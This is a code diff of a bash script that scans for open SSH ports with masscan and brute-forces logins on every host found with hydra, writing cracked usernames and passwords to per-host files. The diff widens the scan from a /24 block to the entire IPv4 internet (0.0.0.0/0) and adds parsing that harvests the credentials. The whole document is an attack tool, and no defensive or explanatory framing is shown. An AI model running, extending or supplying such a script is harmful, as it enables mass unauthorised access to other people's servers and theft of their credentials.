@@ -1,8 +1,8 @@
 #!/bin/bash
 
 # Scan IPv4 range on port 22
-echo -e "Start scanning ...\n"
-masscan 0.0.0.0/24 -p22 --exclude 255.255.255.255 | awk '{print $6}' > result.txt
+echo -e "\nStart scanning ...\n"
+masscan 0.0.0.0/0 -p22 --exclude 255.255.255.255 | awk '{print $6}' > result.txt
 echo -e "\nEnding scanning !\n"
 
 # Brute force
@@ -11,7 +11,7 @@ IFS=$'\n'
 for ip in $(cat result.txt)
 do
 
-  hydra -L users.txt -P passwords.txt ssh://$ip
+  hydra -L users.txt -P passwords.txt -t 4 ssh://$ip | grep "ssh" | grep -v "ssh://" | awk '{print $3, $5, $7}' > parc/$ip.cred
 
 done
 
